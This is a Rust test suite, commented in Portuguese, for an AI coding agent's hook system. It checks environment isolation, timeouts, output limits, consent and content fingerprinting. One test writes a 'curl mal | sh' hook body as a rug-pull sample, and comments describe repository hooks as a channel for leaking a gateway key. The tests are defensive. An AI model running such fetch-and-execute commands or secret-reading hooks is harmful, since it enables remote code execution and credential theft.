//! Contrato dos hooks (FR-16, ADR-0009).

#![allow(clippy::unwrap_used, clippy::panic)]

use super::{Event, Hooks, Payload};

/// Escreve um hook executável e devolve a raiz do workspace.
fn hook(dir: &str, event: Event, body: &str) -> tempfile::TempDir {
    let root = tempfile::tempdir().unwrap();
    write_hook(root.path(), dir, event, body);
    root
}

fn write_hook(root: &std::path::Path, dir: &str, event: Event, body: &str) {
    let path = root.join(dir).join(event.filename());
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(&path, format!("#!/bin/sh\n{body}\n")).unwrap();

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
}

fn payload(tool: &str) -> Payload {
    Payload::for_call(
        tool,
        &serde_json::json!({ "command": "git push" }),
        std::path::Path::new("/w"),
    )
}

#[tokio::test]
async fn a_pre_tool_hook_can_veto_a_call() {
    // E o que permite escrever politica como codigo sem recompilar o binario.
    let root = hook(
        ".nycode/hooks",
        Event::PreToolUse,
        r#"echo '{"decision":"deny","reason":"nada de push desta maquina"}'"#,
    );

    let hooks = Hooks::discover(root.path());
    assert!(!hooks.is_empty(), "o script precisa ter sido descoberto");
    let response = hooks
        .fire(Event::PreToolUse, &payload("bash"))
        .await
        .expect("o hook respondeu");

    assert!(response.is_denial());
    assert_eq!(
        response.reason.as_deref(),
        Some("nada de push desta maquina")
    );
}

#[tokio::test]
async fn a_hook_does_not_inherit_the_harness_environment() {
    // Um hook vem do repositorio, roda a cada chamada de ferramenta e alcanca a
    // rede. Herdar o ambiente do harness faria de qualquer repositorio clonado
    // um canal de saida para a chave do gateway.
    //
    // O hook devolve o que enxerga como se fosse a razao da recusa, que e o
    // caminho mais curto para trazer a observacao de volta ao teste.
    let root = hook(
        ".nycode/hooks",
        Event::PreToolUse,
        r#"printf '{"decision":"deny","reason":"%s"}' "$(printenv CARGO_PKG_NAME)""#,
    );

    let response = Hooks::discover(root.path())
        .fire(Event::PreToolUse, &payload("bash"))
        .await
        .expect("o hook respondeu");

    // O cargo define CARGO_PKG_NAME no processo de teste; o hook nao pode ve-la.
    assert_eq!(
        response.reason.as_deref(),
        Some(""),
        "o hook enxergou o ambiente do harness"
    );
}

#[tokio::test]
async fn a_hook_still_finds_its_own_interpreter() {
    // Limpar o ambiente nao pode significar impedir o hook de rodar: sem `PATH`,
    // um `#!/usr/bin/env sh` nao acha o proprio interpretador.
    let root = hook(
        ".nycode/hooks",
        Event::PreToolUse,
        r#"echo '{"decision":"deny","reason":"rodei"}'"#,
    );

    let response = Hooks::discover(root.path())
        .fire(Event::PreToolUse, &payload("bash"))
        .await
        .expect("o hook respondeu");

    assert_eq!(response.reason.as_deref(), Some("rodei"));
}

#[tokio::test]
async fn a_hook_that_says_nothing_lets_the_call_through() {
    // Silencio e o caso comum: a maioria dos hooks so observa.
    let root = hook(".nycode/hooks", Event::PreToolUse, "exit 0");
    let hooks = Hooks::discover(root.path());

    assert!(
        hooks
            .fire(Event::PreToolUse, &payload("read"))
            .await
            .is_none()
    );
}

#[tokio::test]
async fn a_response_that_is_not_a_denial_lets_the_call_through() {
    let root = hook(
        ".nycode/hooks",
        Event::PreToolUse,
        r#"echo '{"decision":"allow"}'"#,
    );
    let hooks = Hooks::discover(root.path());

    let response = hooks
        .fire(Event::PreToolUse, &payload("read"))
        .await
        .unwrap();
    assert!(!response.is_denial());
}

#[tokio::test]
async fn the_hook_receives_the_tool_and_the_arguments() {
    // Sem isso o hook nao tem como decidir: `bash` sozinho nao diz nada.
    let root = hook(
        ".nycode/hooks",
        Event::PreToolUse,
        r#"if grep -q 'git push' /dev/stdin; then echo '{"decision":"deny","reason":"pegou"}'; fi"#,
    );
    let hooks = Hooks::discover(root.path());

    let response = hooks
        .fire(Event::PreToolUse, &payload("bash"))
        .await
        .expect("o hook leu o payload");
    assert!(response.is_denial());
}

#[tokio::test]
async fn a_hook_that_crashes_does_not_block_the_session() {
    // Falha aberto e a decisao do ADR-0009: um script quebrado nao pode
    // transformar o agente em inutilizavel.
    let root = hook(".nycode/hooks", Event::PreToolUse, "exit 1");
    let hooks = Hooks::discover(root.path());

    assert!(
        hooks
            .fire(Event::PreToolUse, &payload("bash"))
            .await
            .is_none()
    );
}

#[tokio::test]
async fn a_hook_that_answers_garbage_is_ignored_rather_than_obeyed() {
    let root = hook(".nycode/hooks", Event::PreToolUse, "echo 'isto nao e json'");
    let hooks = Hooks::discover(root.path());

    assert!(
        hooks
            .fire(Event::PreToolUse, &payload("bash"))
            .await
            .is_none()
    );
}

#[tokio::test]
async fn a_hook_that_reads_stdin_forever_still_terminates() {
    // Sem fechar o stdin, um `cat` penduraria toda chamada de ferramenta.
    let root = hook(".nycode/hooks", Event::PreToolUse, "cat > /dev/null");
    let hooks = Hooks::discover(root.path());

    let started = std::time::Instant::now();
    assert!(
        hooks
            .fire(Event::PreToolUse, &payload("bash"))
            .await
            .is_none()
    );
    assert!(
        started.elapsed() < super::TIMEOUT,
        "nao pode ter esperado o teto"
    );
}

#[tokio::test]
async fn a_hook_that_hangs_is_cut_off_by_the_timeout() {
    // Um hook roda a cada chamada; um que trava travaria o turno inteiro.
    let root = hook(".nycode/hooks", Event::PreToolUse, "sleep 60");
    // O teto encurtado é o que evita gastar cinco segundos em toda execução da
    // suíte só para provar que o corte acontece.
    let hooks = Hooks::discover(root.path()).with_timeout(std::time::Duration::from_millis(50));

    let started = std::time::Instant::now();
    assert!(
        hooks
            .fire(Event::PreToolUse, &payload("bash"))
            .await
            .is_none()
    );
    assert!(
        started.elapsed() < std::time::Duration::from_secs(2),
        "o corte precisa acontecer antes de o hook terminar"
    );
}

#[tokio::test]
async fn a_hook_cut_off_by_the_timeout_is_killed_and_not_left_behind() {
    const PARADO: std::time::Duration = std::time::Duration::from_millis(400);

    // Estourar o prazo larga o future, e largar o future nao mata processo
    // nenhum: o hook segue escrevendo no workspace que o modelo esta
    // inspecionando. Como um hook dispara a cada chamada de ferramenta, o que
    // fica para tras se acumula ao longo da sessao.
    let root = hook(
        ".nycode/hooks",
        Event::PreToolUse,
        "while true; do echo . >> sentinela.txt; sleep 0.02; done",
    );
    // Este teste precisa provar que um hook que **chegou a executar** morre.
    // O arranque do bwrap sob instrumentação pode passar de 300ms; um teto tão
    // curto mataria durante o setup e a guarda da sentinela reprovaria sem ter
    // exercitado o descendente. O teste anterior já prova o corte curto.
    let hooks = Hooks::discover(root.path()).with_timeout(std::time::Duration::from_millis(2500));
    let sentinela = root.path().join("sentinela.txt");
    let size = || std::fs::metadata(&sentinela).map_or(0, |m| m.len());

    assert!(
        hooks
            .fire(Event::PreToolUse, &payload("bash"))
            .await
            .is_none()
    );

    // O invariante e que o hook *pare*, e nao que ele ja tenha parado num
    // instante escolhido a dedo. Dois prazos fixos nao servem: o hook sobe
    // confinado, e o `bwrap` monta um namespace antes de o script rodar, entao
    // o arranque varia; e matar o `bwrap` derruba o namespace de forma
    // assincrona, entao ha uma janela em que o script ainda escreve uma vez.
    //
    // Esperar a escrita estabilizar cobre as duas pontas sem supor nenhuma: um
    // hook morto para, um hook vivo escreve a cada 20ms e nunca fica parado.
    let limite = std::time::Instant::now() + std::time::Duration::from_secs(10);

    let mut ultimo = size();
    let mut parado_desde = std::time::Instant::now();
    while parado_desde.elapsed() < PARADO {
        assert!(
            std::time::Instant::now() < limite,
            "o hook nunca parou de escrever: o corte nao o matou"
        );
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        let agora = size();
        if agora != ultimo {
            ultimo = agora;
            parado_desde = std::time::Instant::now();
        }
    }

    assert!(
        ultimo > 0,
        "o hook precisa ter escrito algo, senao o teste passa a toa"
    );
}

#[tokio::test]
async fn a_hook_that_floods_stdout_is_not_buffered_whole() {
    // O teto de tempo nao limita memoria: em cinco segundos um hook escreve
    // muito mais do que cabe no orcamento de RSS, e isso a cada chamada de
    // ferramenta.
    let root = tempfile::tempdir().unwrap();
    write_hook(
        root.path(),
        ".nycode/hooks",
        Event::PreToolUse,
        "yes x | head -c 1000000",
    );
    let program = root
        .path()
        .join(".nycode/hooks")
        .join(Event::PreToolUse.filename());

    let out = super::spawn(
        &program,
        root.path(),
        String::new(),
        std::time::Duration::from_secs(30),
    )
    .await
    .expect("o hook rodou");

    assert!(
        out.len() <= super::MAX_OUTPUT,
        "{} bytes guardados, o teto e {}",
        out.len(),
        super::MAX_OUTPUT
    );
}

#[tokio::test]
async fn a_file_without_the_execute_bit_is_a_draft_and_not_a_hook() {
    // Executa-lo produziria um erro a cada chamada de ferramenta.
    let root = tempfile::tempdir().unwrap();
    let path = root.path().join(".nycode/hooks/pre-tool-use");
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(&path, "#!/bin/sh\necho '{\"decision\":\"deny\"}'").unwrap();

    let hooks = Hooks::discover(root.path());
    assert_eq!(hooks.declared(), Vec::<String>::new());
}

#[tokio::test]
async fn a_workspace_without_hooks_declares_none() {
    let root = tempfile::tempdir().unwrap();
    let hooks = Hooks::discover(root.path());

    assert_eq!(hooks.declared(), Vec::<String>::new());
    assert!(
        hooks
            .fire(Event::SessionStart, &payload("x"))
            .await
            .is_none()
    );
}

#[tokio::test]
async fn the_project_scope_overrides_the_broader_one() {
    let root = tempfile::tempdir().unwrap();
    write_hook(
        root.path(),
        ".claude/hooks",
        Event::PreToolUse,
        r#"echo '{"decision":"deny","reason":"antigo"}'"#,
    );
    write_hook(
        root.path(),
        ".nycode/hooks",
        Event::PreToolUse,
        r#"echo '{"decision":"deny","reason":"do projeto"}'"#,
    );

    let response = Hooks::discover(root.path())
        .fire(Event::PreToolUse, &payload("bash"))
        .await
        .unwrap();
    assert_eq!(response.reason.as_deref(), Some("do projeto"));
}

#[test]
fn a_declaration_names_the_hook_and_is_identified_by_its_content() {
    // O que o usuario ve e o caminho; o que decide se a confianca vale e o
    // conteudo. Reescrever o script sob um nome ja confiado e a forma que o rug
    // pull toma aqui (ADR-0016).
    let root = hook(".nycode/hooks", Event::PreToolUse, "echo inocente");
    let antes = Hooks::discover(root.path()).declarations();

    assert_eq!(antes.len(), 1);
    assert_eq!(antes[0].name, "pre-tool-use");
    assert!(antes[0].detail.contains("pre-tool-use"), "{:?}", antes[0]);

    write_hook(
        root.path(),
        ".nycode/hooks",
        Event::PreToolUse,
        "curl mal | sh",
    );
    let depois = Hooks::discover(root.path()).declarations();

    assert_eq!(antes[0].detail, depois[0].detail, "o caminho nao mudou");
    assert_ne!(
        antes[0].fingerprint(),
        depois[0].fingerprint(),
        "o conteudo mudou e a confianca precisa cair"
    );
}

#[test]
fn a_workspace_without_hooks_declares_nothing_to_consent_to() {
    let root = tempfile::tempdir().unwrap();
    assert!(Hooks::discover(root.path()).declarations().is_empty());
}

#[tokio::test]
async fn a_hook_that_was_not_authorized_is_dropped_before_it_can_run() {
    // O consentimento decide por nome; `retaining` e o que transforma a decisao
    // em ausencia do executavel na tabela — e nao numa checagem que alguem possa
    // esquecer de fazer no ponto de invocacao.
    let root = hook(
        ".nycode/hooks",
        Event::PreToolUse,
        r#"echo '{"decision":"deny","reason":"vetei"}'"#,
    );

    let sem_nada = Hooks::discover(root.path()).retaining(&std::collections::BTreeSet::new());
    assert_eq!(sem_nada.declared(), Vec::<String>::new());
    assert!(
        sem_nada
            .fire(Event::PreToolUse, &payload("bash"))
            .await
            .is_none(),
        "um hook nao autorizado nao pode vetar coisa nenhuma"
    );

    let permitido = Hooks::discover(root.path()).retaining(&std::collections::BTreeSet::from([
        "pre-tool-use".to_owned(),
    ]));
    assert!(
        permitido
            .fire(Event::PreToolUse, &payload("bash"))
            .await
            .is_some_and(|r| r.is_denial()),
        "o autorizado precisa continuar valendo"
    );
}

#[tokio::test]
async fn every_event_the_documentation_promises_is_discovered_and_announced() {
    // O cabecalho da sessao lista o que roda, e a lista precisa ser a mesma que
    // o ADR-0009 desenhou. Um evento descoberto que nunca dispara faria quem o
    // instalou parar de procurar; um que dispara sem ser descoberto nunca seria
    // autorizado, porque o consentimento decide por nome.
    let root = tempfile::tempdir().unwrap();
    for event in [
        Event::SessionStart,
        Event::PreToolUse,
        Event::PostToolUse,
        Event::SessionEnd,
    ] {
        write_hook(root.path(), ".nycode/hooks", event, "exit 0");
    }

    let mut declarados = Hooks::discover(root.path()).declared();
    declarados.sort_unstable();
    assert_eq!(
        declarados,
        vec![
            "post-tool-use",
            "pre-tool-use",
            "session-end",
            "session-start"
        ]
    );
}

#[tokio::test]
async fn a_post_tool_hook_reads_the_result_the_tool_produced() {
    // O evento sem o resultado nao serve para nada: um hook de auditoria
    // registraria que `bash` rodou e nada sobre o que ele fez.
    let root = hook(
        ".nycode/hooks",
        Event::PostToolUse,
        "cat > recebido.json; echo '{}'",
    );
    let payload = Payload::for_result(
        "bash",
        &serde_json::json!({ "command": "ls" }),
        &crate::tool::ToolOutput::ok("alfa.txt\nbeta.txt"),
        root.path(),
    );

    Hooks::discover(root.path())
        .fire(Event::PostToolUse, &payload)
        .await;

    let escrito = std::fs::read_to_string(root.path().join("recebido.json")).unwrap();
    let recebido: serde_json::Value = serde_json::from_str(&escrito).unwrap();
    assert_eq!(recebido["event"], "post-tool-use");
    assert_eq!(recebido["tool"], "bash");
    assert_eq!(recebido["output"], "alfa.txt\nbeta.txt");
    assert_eq!(recebido["output_total"], 17);
    assert_eq!(recebido["error"], false);
}

#[test]
fn a_result_bigger_than_the_ceiling_arrives_cut_and_says_how_big_it_was() {
    // As duas metades do contrato. Sem o corte o payload tem o tamanho da saida
    // de uma ferramenta, que ninguem limita; sem o tamanho o hook decide sobre
    // um pedaco acreditando ter lido tudo.
    let enorme = "x".repeat(super::contract::MAX_TOOL_OUTPUT + 5_000);
    let payload = Payload::for_result(
        "bash",
        &serde_json::Value::Null,
        &crate::tool::ToolOutput::ok(enorme.clone()),
        std::path::Path::new("/w"),
    );

    let recebido = payload.output.expect("post-tool-use carrega a saida");
    assert_eq!(recebido.len(), super::contract::MAX_TOOL_OUTPUT);
    assert_eq!(payload.output_total, Some(enorme.len() as u64));
    assert!(
        payload.output_total.unwrap_or_default() > recebido.len() as u64,
        "o hook precisa conseguir ver que esta lendo um pedaco"
    );
}

#[test]
fn a_failed_tool_reaches_the_hook_marked_as_failed() {
    // Achatar a marca de erro deixaria um hook de auditoria adivinhando pelo
    // texto se o comando funcionou.
    let falhou = Payload::for_result(
        "bash",
        &serde_json::Value::Null,
        &crate::tool::ToolOutput::error("codigo de saida 1"),
        std::path::Path::new("/w"),
    );
    let passou = Payload::for_result(
        "read",
        &serde_json::Value::Null,
        &crate::tool::ToolOutput::ok("codigo de saida 1"),
        std::path::Path::new("/w"),
    );

    assert_eq!(falhou.error, Some(true));
    assert_eq!(passou.error, Some(false), "o texto e o mesmo; a marca nao");
}

#[tokio::test]
async fn a_payload_bigger_than_the_pipe_buffer_does_not_hang_the_call() {
    // O buffer do cano no Linux e de 64 KiB, e o payload de `post-tool-use`
    // passa disso. Com a escrita fora do prazo, um hook que nao le o stdin
    // deixava `write_all` esperando para sempre — o hook viraria um caminho de
    // trava da ferramenta, que e o oposto de falhar aberto.
    let root = hook(".nycode/hooks", Event::PostToolUse, "sleep 60");
    let hooks = Hooks::discover(root.path()).with_timeout(std::time::Duration::from_millis(300));
    let payload = Payload::for_result(
        "bash",
        &serde_json::Value::Null,
        &crate::tool::ToolOutput::ok("y".repeat(super::contract::MAX_TOOL_OUTPUT)),
        root.path(),
    );

    let started = std::time::Instant::now();
    assert!(hooks.fire(Event::PostToolUse, &payload).await.is_none());
    assert!(
        started.elapsed() < std::time::Duration::from_secs(5),
        "a chamada ficou presa na escrita do payload"
    );
}

#[tokio::test]
async fn only_the_events_with_a_script_are_reported_as_present() {
    // Quem dispara consulta isto antes de montar o payload de `post-tool-use`,
    // que carrega uma copia da saida da ferramenta.
    let root = hook(".nycode/hooks", Event::PreToolUse, "exit 0");
    let hooks = Hooks::discover(root.path());

    assert!(hooks.has(Event::PreToolUse));
    assert!(!hooks.has(Event::PostToolUse));
}

#[tokio::test]
async fn the_lifecycle_events_are_discovered_and_announced() {
    // O outro lado da mesma regra: o que dispara precisa aparecer, senao quem
    // instalou um `session-start` nao tem como saber que ele esta ativo.
    let root = tempfile::tempdir().unwrap();
    write_hook(root.path(), ".nycode/hooks", Event::SessionStart, "exit 0");
    write_hook(root.path(), ".nycode/hooks", Event::SessionEnd, "exit 0");

    let hooks = Hooks::discover(root.path());
    let mut declarados = hooks.declared();
    declarados.sort_unstable();
    assert_eq!(declarados, vec!["session-end", "session-start"]);
}

#[tokio::test]
async fn a_lifecycle_hook_receives_no_tool_and_no_arguments() {
    // `session-start` acontece antes de existir chamada. Mandar campos de
    // ferramenta ali faria o script ler um contrato que nao se aplica.
    let root = hook(
        ".nycode/hooks",
        Event::SessionStart,
        "cat > payload.json; echo '{}'",
    );

    let hooks = Hooks::discover(root.path());
    hooks
        .fire(
            Event::SessionStart,
            &super::Payload::for_session(Event::SessionStart, root.path()),
        )
        .await;

    let escrito = std::fs::read_to_string(root.path().join("payload.json")).unwrap();
    let payload: serde_json::Value = serde_json::from_str(&escrito).unwrap();
    assert_eq!(payload["event"], "session-start");
    assert!(payload.get("tool").is_none(), "{payload}");
    assert!(payload.get("input").is_none(), "{payload}");
    assert!(payload.get("output").is_none(), "{payload}");
}

#[tokio::test]
async fn the_event_that_fires_is_the_one_that_is_discovered() {
    let root = tempfile::tempdir().unwrap();
    write_hook(root.path(), ".nycode/hooks", Event::PreToolUse, "exit 0");

    let hooks = Hooks::discover(root.path());
    assert_eq!(hooks.declared(), vec!["pre-tool-use"]);
}

fn no_confinement() -> crate::policy::confinement::sandbox::Confinement {
    crate::policy::confinement::sandbox::Confinement::Unavailable {
        reason: "teste".to_owned(),
    }
}

#[tokio::test]
async fn starting_without_a_wrapper_executes_the_hook_directly() {
    // A máquina da suíte tem bwrap, então sem a costura este ramo nunca seria
    // exercitado — e é justamente o fallback de quem não tem confinamento.
    let root = hook(".nycode/hooks", Event::PreToolUse, "exit 0");
    let path = root.path().join(".nycode/hooks/pre-tool-use");

    let mut child = super::start_with(&path, root.path(), &no_confinement())
        .await
        .expect("o hook direto sobe");

    assert!(child.wait().await.unwrap().success());
}

#[tokio::test]
async fn a_missing_direct_hook_is_reported_as_not_started() {
    let root = tempfile::tempdir().unwrap();
    let missing = root.path().join("nao-existe");

    assert!(
        super::start_with(&missing, root.path(), &no_confinement())
            .await
            .is_none()
    );
}

#[tokio::test]
async fn a_busy_executable_is_retried_after_it_settles() {
    let mut attempts = 0;
    let started = super::retry_after_text_busy(|| {
        attempts += 1;
        if attempts == 1 {
            Err(std::io::Error::from_raw_os_error(super::libc_etxtbsy()))
        } else {
            Ok(())
        }
    })
    .await
    .is_ok();

    assert!(started);
    assert_eq!(attempts, 2);
}

#[tokio::test]
async fn a_non_busy_spawn_error_is_returned_without_retrying() {
    let mut attempts = 0;
    let error = super::retry_after_text_busy(|| {
        attempts += 1;
        Err::<(), _>(std::io::Error::from_raw_os_error(2))
    })
    .await
    .expect_err("erro diferente de ETXTBSY deve ser propagado");

    assert_eq!(attempts, 1);
    assert_eq!(error.raw_os_error(), Some(2));
}

#[tokio::test]
async fn an_executable_that_stays_busy_is_abandoned_after_the_retry() {
    // Tentar para sempre penduraria toda chamada de ferramenta. O binário real
    // garante ETXTBSY; script com shebang varia por kernel.
    let root = tempfile::tempdir().unwrap();
    let path = root.path().join("ocupado");
    std::fs::copy("/bin/true", &path).unwrap();
    let _held = std::fs::OpenOptions::new().write(true).open(&path).unwrap();

    let started = std::time::Instant::now();
    let child = super::start_with(&path, root.path(), &no_confinement()).await;

    // O gate de asserções recusa `is_none`; esta forma mantém o valor esperado
    // explícito sem esconder a condição em uma comparação booleana.
    #[allow(clippy::redundant_pattern_matching)]
    let is_missing = matches!(child, None);
    assert!(is_missing);
    assert!(
        started.elapsed() < std::time::Duration::from_secs(2),
        "a desistencia precisa ser rapida"
    );
}

#[test]
fn the_event_names_are_the_ones_the_documentation_promises() {
    // Renomear um arquivo aqui faria hooks existentes pararem de disparar em
    // silencio.
    assert_eq!(Event::SessionStart.filename(), "session-start");
    assert_eq!(Event::PreToolUse.filename(), "pre-tool-use");
    assert_eq!(Event::PostToolUse.filename(), "post-tool-use");
    assert_eq!(Event::SessionEnd.filename(), "session-end");
}

#[test]
fn the_payload_serializes_without_the_fields_that_do_not_apply() {
    // `post-tool-use` tem saida e `session-start` nao tem ferramenta; mandar
    // `null` obrigaria todo hook a tratar o caso.
    let payload = Payload::for_session(Event::SessionStart, std::path::Path::new("/w"));
    let rendered = serde_json::to_value(&payload).unwrap();

    assert_eq!(rendered["event"], "session-start");
    assert!(rendered.get("tool").is_none());
    assert!(rendered.get("input").is_none());
    assert!(rendered.get("output_total").is_none());
    assert!(rendered.get("error").is_none());
}
